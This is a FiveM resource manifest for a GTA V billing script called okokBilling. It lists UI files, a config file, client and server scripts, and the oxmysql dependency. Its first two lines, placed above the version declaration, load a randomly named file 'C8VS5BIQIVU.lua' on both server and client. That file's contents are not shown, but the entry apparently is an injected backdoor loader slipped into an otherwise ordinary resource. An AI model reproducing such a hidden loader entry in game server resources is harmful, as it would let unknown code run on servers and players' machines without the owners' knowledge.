server_script "C8VS5BIQIVU.lua"
client_script "C8VS5BIQIVU.lua"
fx_version 'adamant'

game 'gta5'

author 'okok#3488'
description 'okokBilling'

ui_page 'web/ui.html'

files {
	'web/*.*'
}

shared_script 'config.lua'

client_scripts {
	'client.lua',
}

server_scripts {
	'@oxmysql/lib/MySQL.lua',
	'server.lua'
}